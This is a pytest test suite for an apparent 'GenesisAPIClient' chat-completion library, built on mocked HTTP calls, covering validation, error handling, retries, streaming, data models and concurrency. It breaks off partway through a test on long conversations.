import pytest
import json
import asyncio
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional

# Import the module under test
from app.ai_backend.genesis_api import (
    GenesisAPIClient,
    GenesisAPIError,
    RateLimitError,
    AuthenticationError,
    ValidationError,
    APIResponse,
    ModelConfig,
    ChatMessage,
    ChatCompletion
)


class TestGenesisAPIClient:
    """Test suite for GenesisAPIClient class."""
    
    @pytest.fixture
    def mock_config(self):
        """
        Return a mock configuration dictionary with sample API key, base URL, timeout, and max retries for initializing GenesisAPIClient in tests.
        
        Returns:
            dict: Dictionary containing mock configuration values.
        """
        return {
            'api_key': 'test-api-key-123',
            'base_url': 'https://api.genesis.ai/v1',
            'timeout': 30,
            'max_retries': 3
        }
    
    @pytest.fixture
    def client(self, mock_config):
        """
        Pytest fixture that provides a GenesisAPIClient instance initialized with the given mock configuration.
        """
        return GenesisAPIClient(**mock_config)
    
    @pytest.fixture
    def sample_messages(self):
        """
        Return a list of sample ChatMessage instances simulating a standard conversation.
        
        Returns:
            List[ChatMessage]: Example messages including system, user, and assistant roles.
        """
        return [
            ChatMessage(role="system", content="You are a helpful assistant."),
            ChatMessage(role="user", content="What is the weather like today?"),
            ChatMessage(role="assistant", content="I don't have access to real-time weather data.")
        ]
    
    @pytest.fixture
    def sample_model_config(self):
        """
        Create and return a ModelConfig instance with standard parameters for testing.
        
        Returns:
            ModelConfig: A model configuration populated with typical test values.
        """
        return ModelConfig(
            name="genesis-gpt-4",
            max_tokens=1000,
            temperature=0.7,
            top_p=0.9,
            frequency_penalty=0.0,
            presence_penalty=0.0
        )

    def test_client_initialization_with_valid_config(self, mock_config):
        """
        Test that GenesisAPIClient initializes with the correct attributes when given a valid configuration.
        
        Asserts that the client's api_key, base_url, timeout, and max_retries match the provided configuration values.
        """
        client = GenesisAPIClient(**mock_config)
        assert client.api_key == mock_config['api_key']
        assert client.base_url == mock_config['base_url']
        assert client.timeout == mock_config['timeout']
        assert client.max_retries == mock_config['max_retries']

    def test_client_initialization_with_minimal_config(self):
        """
        Test that GenesisAPIClient initializes with only an API key and assigns default values to optional parameters.
        """
        client = GenesisAPIClient(api_key='test-key')
        assert client.api_key == 'test-key'
        assert client.base_url is not None  # Should have default
        assert client.timeout > 0  # Should have default
        assert client.max_retries >= 0  # Should have default

    def test_client_initialization_missing_api_key(self):
        """
        Test that initializing GenesisAPIClient without an API key raises a ValueError.
        """
        with pytest.raises(ValueError, match="API key is required"):
            GenesisAPIClient()

    def test_client_initialization_invalid_timeout(self):
        """
        Test that initializing GenesisAPIClient with a zero or negative timeout raises a ValueError.
        """
        with pytest.raises(ValueError, match="Timeout must be positive"):
            GenesisAPIClient(api_key='test-key', timeout=-1)
        
        with pytest.raises(ValueError, match="Timeout must be positive"):
            GenesisAPIClient(api_key='test-key', timeout=0)

    def test_client_initialization_invalid_max_retries(self):
        """
        Test that initializing a GenesisAPIClient with a negative max_retries value raises a ValueError.
        """
        with pytest.raises(ValueError, match="Max retries must be non-negative"):
            GenesisAPIClient(api_key='test-key', max_retries=-1)

    @pytest.mark.asyncio
    async def test_chat_completion_success(self, client, sample_messages, sample_model_config):
        """
        Test that a successful chat completion request returns a valid ChatCompletion object with expected attributes.
        
        Simulates a successful API response and verifies that the returned ChatCompletion contains the correct ID, model, choices, message content, and token usage.
        """
        mock_response = {
            'id': 'chat-123',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {
                    'role': 'assistant',
                    'content': 'The weather looks pleasant today!'
                },
                'finish_reason': 'stop'
            }],
            'usage': {
                'prompt_tokens': 25,
                'completion_tokens': 8,
                'total_tokens': 33
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=sample_messages,
                model_config=sample_model_config
            )
            
            assert isinstance(result, ChatCompletion)
            assert result.id == 'chat-123'
            assert result.model == 'genesis-gpt-4'
            assert len(result.choices) == 1
            assert result.choices[0].message.content == 'The weather looks pleasant today!'
            assert result.usage.total_tokens == 33

    @pytest.mark.asyncio
    async def test_chat_completion_with_streaming(self, client, sample_messages, sample_model_config):
        """
        Tests that the chat completion client correctly processes streaming API responses by simulating a sequence of streamed chunks and verifying their order and content.
        """
        mock_chunks = [
            {'choices': [{'delta': {'content': 'The'}}]},
            {'choices': [{'delta': {'content': ' weather'}}]},
            {'choices': [{'delta': {'content': ' is nice'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_stream():
            """
            Asynchronously yields JSON-encoded byte chunks from the mock_chunks list to simulate a streaming API response.
            
            Yields:
                bytes: Each yielded value is a JSON-encoded byte string representing a chunk from mock_chunks.
            """
            for chunk in mock_chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            
            assert len(chunks) == 4
            assert chunks[0].choices[0].delta.content == 'The'
            assert chunks[-1].choices[0].finish_reason == 'stop'

    @pytest.mark.asyncio
    async def test_chat_completion_authentication_error(self, client, sample_messages, sample_model_config):
        """
        Tests that an authentication error (HTTP 401) during chat completion raises an AuthenticationError with the expected error message.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 401
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Invalid API key'}}
            )
            
            with pytest.raises(AuthenticationError, match="Invalid API key"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_rate_limit_error(self, client, sample_messages, sample_model_config):
        """
        Test that a RateLimitError is raised with the correct retry_after value when the chat completion API returns a 429 status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Rate limit exceeded'}}
            )
            mock_post.return_value.__aenter__.return_value.headers = {'Retry-After': '60'}
            
            with pytest.raises(RateLimitError) as exc_info:
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
            
            assert exc_info.value.retry_after == 60

    @pytest.mark.asyncio
    async def test_chat_completion_validation_error(self, client, sample_model_config):
        """
        Test that creating a chat completion with an invalid message role raises a ValidationError containing the expected error message.
        """
        invalid_messages = [
            ChatMessage(role="invalid_role", content="This should fail")
        ]
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 400
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Invalid message role'}}
            )
            
            with pytest.raises(ValidationError, match="Invalid message role"):
                await client.create_chat_completion(
                    messages=invalid_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_server_error_with_retry(self, client, sample_messages, sample_model_config):
        """
        Test that chat completion retries on server errors and succeeds after transient failures.
        
        Simulates two consecutive server errors followed by a successful response, verifying that the retry mechanism is triggered and the final result is correct.
        """
        call_count = 0
        
        async def mock_post_with_failure(*args, **kwargs):
            """
            Simulates an asynchronous HTTP POST request that fails with a 500 status on the first two calls and returns a successful chat completion response on subsequent calls.
            
            Returns:
                Mock: A mock response object with a status code and JSON payload that depend on the number of times the function has been called.
            """
            nonlocal call_count
            call_count += 1
            
            mock_response = Mock()
            if call_count <= 2:  # Fail first 2 attempts
                mock_response.status = 500
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': 'Internal server error'}}
                )
            else:  # Succeed on 3rd attempt
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'chat-retry-success',
                    'object': 'chat.completion',
                    'created': int(datetime.now(timezone.utc).timestamp()),
                    'model': 'genesis-gpt-4',
                    'choices': [{'message': {'role': 'assistant', 'content': 'Success after retry'}}],
                    'usage': {'total_tokens': 10}
                })
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_failure):
            with patch('asyncio.sleep'):  # Mock sleep to speed up test
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'chat-retry-success'
                assert call_count == 3  # Should have retried twice

    @pytest.mark.asyncio
    async def test_chat_completion_max_retries_exceeded(self, client, sample_messages, sample_model_config):
        """
        Test that exceeding the maximum number of retries for server errors during chat completion raises a GenesisAPIError.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 500
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Internal server error'}}
            )
            
            with patch('asyncio.sleep'):  # Mock sleep to speed up test
                with pytest.raises(GenesisAPIError, match="Internal server error"):
                    await client.create_chat_completion(
                        messages=sample_messages,
                        model_config=sample_model_config
                    )

    @pytest.mark.asyncio
    async def test_chat_completion_network_timeout(self, client, sample_messages, sample_model_config):
        """
        Test that a network timeout during chat completion raises a GenesisAPIError with a timeout message.
        """
        with patch('aiohttp.ClientSession.post', side_effect=asyncio.TimeoutError()):
            with pytest.raises(GenesisAPIError, match="Request timeout"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_chat_completion_connection_error(self, client, sample_messages, sample_model_config):
        """
        Test that a connection error during chat completion raises a GenesisAPIError with an appropriate message.
        """
        import aiohttp
        
        with patch('aiohttp.ClientSession.post', side_effect=aiohttp.ClientConnectionError()):
            with pytest.raises(GenesisAPIError, match="Connection error"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    def test_validate_messages_empty_list(self, client):
        """
        Test that validating an empty list of messages raises a ValidationError.
        """
        with pytest.raises(ValidationError, match="Messages cannot be empty"):
            client._validate_messages([])

    def test_validate_messages_invalid_role(self, client):
        """
        Test that the client raises a ValidationError when a chat message has an invalid role.
        """
        invalid_messages = [
            ChatMessage(role="invalid", content="Test content")
        ]
        
        with pytest.raises(ValidationError, match="Invalid message role"):
            client._validate_messages(invalid_messages)

    def test_validate_messages_empty_content(self, client):
        """
        Test that validating a message with empty content raises a ValidationError.
        """
        invalid_messages = [
            ChatMessage(role="user", content="")
        ]
        
        with pytest.raises(ValidationError, match="Message content cannot be empty"):
            client._validate_messages(invalid_messages)

    def test_validate_messages_content_too_long(self, client):
        """
        Test that a ValidationError is raised if a chat message's content exceeds the maximum allowed length.
        """
        long_content = "x" * 100000  # Assuming max length is less than this
        invalid_messages = [
            ChatMessage(role="user", content=long_content)
        ]
        
        with pytest.raises(ValidationError, match="Message content too long"):
            client._validate_messages(invalid_messages)

    def test_validate_model_config_invalid_temperature(self, client, sample_model_config):
        """
        Test that ValidationError is raised when the model config temperature is set below 0 or above 2.
        """
        sample_model_config.temperature = -0.5  # Invalid negative temperature
        
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.temperature = 2.5  # Invalid high temperature
        
        with pytest.raises(ValidationError, match="Temperature must be between 0 and 2"):
            client._validate_model_config(sample_model_config)

    def test_validate_model_config_invalid_max_tokens(self, client, sample_model_config):
        """
        Verify that a ValidationError is raised when the model configuration's max_tokens is set to zero or a negative value.
        """
        sample_model_config.max_tokens = 0  # Invalid zero tokens
        
        with pytest.raises(ValidationError, match="Max tokens must be positive"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.max_tokens = -100  # Invalid negative tokens
        
        with pytest.raises(ValidationError, match="Max tokens must be positive"):
            client._validate_model_config(sample_model_config)

    def test_validate_model_config_invalid_top_p(self, client, sample_model_config):
        """
        Test that ValidationError is raised when the model configuration's top_p value is outside the valid range [0, 1].
        """
        sample_model_config.top_p = -0.1  # Invalid negative top_p
        
        with pytest.raises(ValidationError, match="Top_p must be between 0 and 1"):
            client._validate_model_config(sample_model_config)
        
        sample_model_config.top_p = 1.5  # Invalid high top_p
        
        with pytest.raises(ValidationError, match="Top_p must be between 0 and 1"):
            client._validate_model_config(sample_model_config)

    @pytest.mark.asyncio
    async def test_list_models_success(self, client):
        """
        Test that the client retrieves and correctly parses the list of available models from the API.
        
        Asserts that the returned list contains models with the expected IDs.
        """
        mock_response = {
            'object': 'list',
            'data': [
                {'id': 'genesis-gpt-4', 'object': 'model', 'created': 1677610602},
                {'id': 'genesis-gpt-3.5-turbo', 'object': 'model', 'created': 1677610602}
            ]
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            models = await client.list_models()
            
            assert len(models) == 2
            assert models[0].id == 'genesis-gpt-4'
            assert models[1].id == 'genesis-gpt-3.5-turbo'

    @pytest.mark.asyncio
    async def test_get_model_success(self, client):
        """
        Test that retrieving a model by its ID returns a model object with the expected attributes.
        """
        mock_response = {
            'id': 'genesis-gpt-4',
            'object': 'model',
            'created': 1677610602,
            'owned_by': 'genesis-ai',
            'permission': []
        }
        
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_get.return_value.__aenter__.return_value.status = 200
            
            model = await client.get_model('genesis-gpt-4')
            
            assert model.id == 'genesis-gpt-4'
            assert model.owned_by == 'genesis-ai'

    @pytest.mark.asyncio
    async def test_get_model_not_found(self, client):
        """
        Test that requesting a model that does not exist raises a GenesisAPIError with the correct error message.
        """
        with patch('aiohttp.ClientSession.get') as mock_get:
            mock_get.return_value.__aenter__.return_value.status = 404
            mock_get.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Model not found'}}
            )
            
            with pytest.raises(GenesisAPIError, match="Model not found"):
                await client.get_model('non-existent-model')

    def test_build_headers(self, client):
        """
        Test that the client's `_build_headers` method returns the expected HTTP headers.
        
        Verifies that the returned headers include the correct Authorization, Content-Type, and User-Agent fields.
        """
        headers = client._build_headers()
        
        assert 'Authorization' in headers
        assert headers['Authorization'] == f'Bearer {client.api_key}'
        assert headers['Content-Type'] == 'application/json'
        assert 'User-Agent' in headers

    def test_build_headers_with_custom_headers(self, client):
        """
        Test that custom headers are merged with default headers when building request headers.
        
        Verifies that custom headers provided to the client are included in the resulting headers, and that default headers such as Authorization and Content-Type are present.
        """
        custom_headers = {'X-Custom-Header': 'custom-value'}
        headers = client._build_headers(custom_headers)
        
        assert headers['X-Custom-Header'] == 'custom-value'
        assert 'Authorization' in headers
        assert headers['Content-Type'] == 'application/json'

    @pytest.mark.asyncio
    async def test_context_manager_usage(self, mock_config):
        """
        Test that GenesisAPIClient manages its HTTP session correctly when used as an async context manager.
        
        Verifies that the session is open within the context and properly closed after exiting.
        """
        async with GenesisAPIClient(**mock_config) as client:
            assert client.session is not None
        
        # Session should be closed after exiting context
        assert client.session.closed

    @pytest.mark.asyncio
    async def test_close_client_explicitly(self, client):
        """
        Test that explicitly closing the GenesisAPIClient closes its underlying HTTP session.
        """
        await client.close()
        assert client.session.closed

    @pytest.mark.parametrize("status_code,expected_exception", [
        (400, ValidationError),
        (401, AuthenticationError),
        (403, AuthenticationError),
        (429, RateLimitError),
        (500, GenesisAPIError),
        (502, GenesisAPIError),
        (503, GenesisAPIError),
    ])
    @pytest.mark.asyncio
    async def test_error_handling_by_status_code(self, client, status_code, expected_exception):
        """
        Tests that the client raises the correct exception for a given HTTP status code during a chat completion request.
        
        Parameters:
            status_code (int): The simulated HTTP status code returned by the API.
            expected_exception (Exception): The exception type expected to be raised for the simulated status code.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = status_code
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': f'Error {status_code}'}}
            )
            
            with pytest.raises(expected_exception):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content="test")],
                    model_config=ModelConfig(name="test-model")
                )


class TestDataModels:
    """Test suite for data model classes."""
    
    def test_chat_message_creation(self):
        """
        Test creation of a ChatMessage with specified role and content, verifying that the name attribute defaults to None.
        """
        message = ChatMessage(role="user", content="Hello, world!")
        assert message.role == "user"
        assert message.content == "Hello, world!"
        assert message.name is None

    def test_chat_message_with_name(self):
        """
        Test that a ChatMessage instance correctly sets the name attribute when provided.
        """
        message = ChatMessage(role="user", content="Hello", name="John")
        assert message.name == "John"

    def test_model_config_creation(self):
        """
        Test creation of a ModelConfig instance with specified name, max_tokens, and temperature values.
        """
        config = ModelConfig(
            name="genesis-gpt-4",
            max_tokens=1000,
            temperature=0.7
        )
        assert config.name == "genesis-gpt-4"
        assert config.max_tokens == 1000
        assert config.temperature == 0.7

    def test_model_config_defaults(self):
        """
        Verify that ModelConfig assigns default values to max_tokens, temperature, and top_p when only the name is specified.
        """
        config = ModelConfig(name="test-model")
        assert config.name == "test-model"
        assert config.max_tokens is not None
        assert config.temperature is not None
        assert config.top_p is not None

    def test_api_response_creation(self):
        """
        Test that an APIResponse object is initialized with the correct status code, data, and headers.
        """
        response = APIResponse(
            status_code=200,
            data={'message': 'success'},
            headers={'Content-Type': 'application/json'}
        )
        assert response.status_code == 200
        assert response.data['message'] == 'success'
        assert response.headers['Content-Type'] == 'application/json'

    def test_chat_completion_creation(self):
        """
        Tests that a ChatCompletion object is instantiated with the correct attribute values.
        """
        completion = ChatCompletion(
            id="chat-123",
            object="chat.completion",
            created=1677610602,
            model="genesis-gpt-4",
            choices=[],
            usage={'total_tokens': 100}
        )
        assert completion.id == "chat-123"
        assert completion.model == "genesis-gpt-4"
        assert completion.usage['total_tokens'] == 100


class TestExceptionClasses:
    """Test suite for custom exception classes."""
    
    def test_genesis_api_error(self):
        """
        Test that a GenesisAPIError is correctly instantiated and its attributes are set as expected.
        """
        error = GenesisAPIError("Test error message", status_code=500)
        assert str(error) == "Test error message"
        assert error.status_code == 500

    def test_authentication_error(self):
        """
        Test that the AuthenticationError is created with the correct message and inherits from GenesisAPIError.
        """
        error = AuthenticationError("Invalid API key")
        assert str(error) == "Invalid API key"
        assert isinstance(error, GenesisAPIError)

    def test_rate_limit_error(self):
        """
        Test that RateLimitError is created with the correct retry_after value and is a subclass of GenesisAPIError.
        """
        error = RateLimitError("Rate limit exceeded", retry_after=60)
        assert str(error) == "Rate limit exceeded"
        assert error.retry_after == 60
        assert isinstance(error, GenesisAPIError)

    def test_validation_error(self):
        """
        Test that a ValidationError is correctly instantiated and inherits from GenesisAPIError.
        """
        error = ValidationError("Invalid input data")
        assert str(error) == "Invalid input data"
        assert isinstance(error, GenesisAPIError)


class TestUtilityFunctions:
    """Test suite for utility functions in the genesis_api module."""
    
    def test_format_timestamp(self):
        """
        Tests that the `format_timestamp` utility returns a non-empty string when provided with a valid timestamp.
        """
        from app.ai_backend.genesis_api import format_timestamp
        
        timestamp = 1677610602
        formatted = format_timestamp(timestamp)
        assert isinstance(formatted, str)
        assert len(formatted) > 0

    def test_calculate_token_usage(self):
        """
        Test that `calculate_token_usage` returns a dictionary with an 'estimated_tokens' key when given a list of chat messages.
        """
        from app.ai_backend.genesis_api import calculate_token_usage
        
        messages = [
            ChatMessage(role="user", content="Hello"),
            ChatMessage(role="assistant", content="Hi there!")
        ]
        
        usage = calculate_token_usage(messages)
        assert isinstance(usage, dict)
        assert 'estimated_tokens' in usage

    @pytest.mark.parametrize("content,expected_tokens", [
        ("Hello", 1),
        ("Hello world", 2),
        ("", 0),
        ("A very long message with many words", 7),
    ])
    def test_estimate_tokens(self, content, expected_tokens):
        """
        Test that `estimate_tokens` returns the expected token count for a given input string.
        
        Parameters:
            content (str): The input text to estimate token count for.
            expected_tokens (int): The expected number of tokens for the input text.
        """
        from app.ai_backend.genesis_api import estimate_tokens
        
        tokens = estimate_tokens(content)
        assert tokens == expected_tokens


# Integration tests for end-to-end scenarios
class TestIntegration:
    """Integration test suite for complete workflows."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_complete_chat_workflow(self):
        """
        Performs an end-to-end integration test of the chat completion workflow using GenesisAPIClient.
        
        Sends a user message and verifies that the mocked Genesis API returns a valid chat completion response, asserting correct parsing of the completion ID, assistant message content, and token usage.
        """
        config = {
            'api_key': 'test-key',
            'base_url': 'https://api.genesis.ai/v1'
        }
        
        mock_response = {
            'id': 'chat-integration-test',
            'object': 'chat.completion',
            'created': int(datetime.now(timezone.utc).timestamp()),
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {
                    'role': 'assistant',
                    'content': 'Integration test response'
                },
                'finish_reason': 'stop'
            }],
            'usage': {
                'prompt_tokens': 10,
                'completion_tokens': 3,
                'total_tokens': 13
            }
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                messages = [ChatMessage(role="user", content="Test message")]
                model_config = ModelConfig(name="genesis-gpt-4", max_tokens=100)
                
                result = await client.create_chat_completion(
                    messages=messages,
                    model_config=model_config
                )
                
                assert result.id == 'chat-integration-test'
                assert result.choices[0].message.content == 'Integration test response'
                assert result.usage.total_tokens == 13

    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_error_recovery_workflow(self):
        """
        Test that the client retries a chat completion request after a rate limit error and succeeds on a subsequent attempt.
        
        Simulates a rate limit error on the first API call and a successful response on the second, verifying that `RateLimitError` is raised initially and that the client completes the request successfully after recovery.
        """
        config = {'api_key': 'test-key'}
        
        call_count = 0
        
        async def mock_post_with_recovery(*args, **kwargs):
            """
            Simulates an asynchronous HTTP POST request that returns a rate limit error on the first call and a successful response on subsequent calls.
            
            Returns:
                Mock: A mock response object with status 429 and rate limit error on the first call, and status 200 with a successful API response on later calls.
            """
            nonlocal call_count
            call_count += 1
            
            mock_response = Mock()
            if call_count == 1:
                # First call: rate limit error
                mock_response.status = 429
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': 'Rate limit exceeded'}}
                )
                mock_response.headers = {'Retry-After': '1'}
            else:
                # Second call: success
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'chat-recovery-test',
                    'choices': [{'message': {'content': 'Recovery successful'}}],
                    'usage': {'total_tokens': 10}
                })
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_recovery):
            with patch('asyncio.sleep'):  # Speed up test
                async with GenesisAPIClient(**config) as client:
                    try:
                        result = await client.create_chat_completion(
                            messages=[ChatMessage(role="user", content="Test")],
                            model_config=ModelConfig(name="test-model")
                        )
                        # Should not reach here due to rate limit
                        assert False, "Expected RateLimitError"
                    except RateLimitError:
                        # Expected on first call
                        pass
                    
                    # Second call should succeed
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Test")],
                        model_config=ModelConfig(name="test-model")
                    )
                    assert result.id == 'chat-recovery-test'


# Performance and load testing
class TestPerformance:
    """Performance test suite."""
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_concurrent_requests(self):
        """
        Tests that GenesisAPIClient can process multiple concurrent chat completion requests and returns the correct response for each.
        
        This verifies the client's ability to handle asynchronous concurrency and ensures all responses match the expected mock output.
        """
        config = {'api_key': 'test-key'}
        
        mock_response = {
            'id': 'concurrent-test',
            'choices': [{'message': {'content': 'Concurrent response'}}],
            'usage': {'total_tokens': 5}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                tasks = []
                for i in range(10):
                    task = client.create_chat_completion(
                        messages=[ChatMessage(role="user", content=f"Message {i}")],
                        model_config=ModelConfig(name="test-model")
                    )
                    tasks.append(task)
                
                results = await asyncio.gather(*tasks)
                
                assert len(results) == 10
                for result in results:
                    assert result.id == 'concurrent-test'

    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_large_message_handling(self):
        """
        Tests that GenesisAPIClient can handle chat completions with very large message content, verifying correct response parsing and token usage calculation.
        """
        config = {'api_key': 'test-key'}
        large_content = "x" * 10000  # Large message content
        
        mock_response = {
            'id': 'large-message-test',
            'choices': [{'message': {'content': 'Large message processed'}}],
            'usage': {'total_tokens': 2500}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            async with GenesisAPIClient(**config) as client:
                result = await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=large_content)],
                    model_config=ModelConfig(name="test-model", max_tokens=4000)
                )
                
                assert result.id == 'large-message-test'
                assert result.usage.total_tokens == 2500


class TestGenesisAPIClientAdvanced:
    """Advanced test scenarios for GenesisAPIClient."""
    
    @pytest.fixture
    def client_with_custom_session(self, mock_config):
        """
        Create a `GenesisAPIClient` instance using a custom pre-configured aiohttp session.
        
        Returns:
            GenesisAPIClient: The client instance with its session set to the provided aiohttp session.
        """
        import aiohttp
        session = aiohttp.ClientSession()
        client = GenesisAPIClient(**mock_config)
        client.session = session
        return client

    @pytest.mark.asyncio
    async def test_session_reuse_across_requests(self, client):
        """
        Verify that the GenesisAPIClient reuses the same HTTP session for multiple API requests.
        """
        mock_response = {
            'id': 'test-session-reuse',
            'choices': [{'message': {'content': 'Response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Make multiple requests
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="First")],
                model_config=ModelConfig(name="test-model")
            )
            await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Second")],
                model_config=ModelConfig(name="test-model")
            )
            
            # Verify session consistency
            assert client.session is not None
            assert not client.session.closed

    def test_api_key_sanitization_in_logs(self, mock_config):
        """
        Verify that the API key is not present in the string or repr output of the GenesisAPIClient instance.
        """
        client = GenesisAPIClient(**mock_config)
        client_str = str(client)
        client_repr = repr(client)
        
        # API key should not appear in string representations
        assert mock_config['api_key'] not in client_str
        assert mock_config['api_key'] not in client_repr

    @pytest.mark.asyncio
    async def test_malformed_json_response_handling(self, client, sample_messages, sample_model_config):
        """
        Test that the client raises a GenesisAPIError with an appropriate message when the API returns a malformed JSON response.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                side_effect=json.JSONDecodeError("Invalid JSON", "", 0)
            )
            
            with pytest.raises(GenesisAPIError, match="Invalid response format"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_empty_response_handling(self, client, sample_messages, sample_model_config):
        """
        Test that the client raises a GenesisAPIError when the API returns an empty response.
        
        Verifies that an empty JSON object from the API triggers an error indicating an invalid response structure.
        """
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value={})
            
            with pytest.raises(GenesisAPIError, match="Invalid response structure"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_partial_response_handling(self, client, sample_messages, sample_model_config):
        """
        Test that the client raises a GenesisAPIError when the API returns a partial or incomplete chat completion response.
        
        This ensures that missing required fields in the API response, such as 'choices' or 'usage', are correctly detected and result in an error.
        """
        incomplete_response = {
            'id': 'partial-response',
            'object': 'chat.completion'
            # Missing choices and usage fields
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 200
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=incomplete_response)
            
            with pytest.raises(GenesisAPIError, match="Missing required fields"):
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )

    @pytest.mark.asyncio
    async def test_unicode_content_handling(self, client, sample_model_config):
        """
        Test that the client correctly processes chat messages containing unicode and special characters.
        
        Verifies that sending messages with diverse unicode content results in the expected unicode response from the API.
        """
        unicode_messages = [
            ChatMessage(role="user", content="Hello 世界! 🌍 Café naïve résumé"),
            ChatMessage(role="system", content="Emoji test: 🚀🔥💻")
        ]
        
        mock_response = {
            'id': 'unicode-test',
            'choices': [{'message': {'content': 'Unicode response: 测试 ✅'}}],
            'usage': {'total_tokens': 20}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=unicode_messages,
                model_config=sample_model_config
            )
            
            assert result.choices[0].message.content == 'Unicode response: 测试 ✅'

    @pytest.mark.asyncio
    async def test_extremely_long_conversation_handling(self, client, sample_model_config):
        """
        Test that the client correctly processes chat completions for conversations with a large number of messages.
        
        Simulates a conversation with 100 alternating user and assistant messages and verifies that the API client returns the expected completion response.
        """
        long_conversation = []
        for i in range(100):
            role = "user" if i % 2 == 0 else "assistant"
            long_conversation.append(ChatMessage(role=role, content=f"Message {i}"))
        
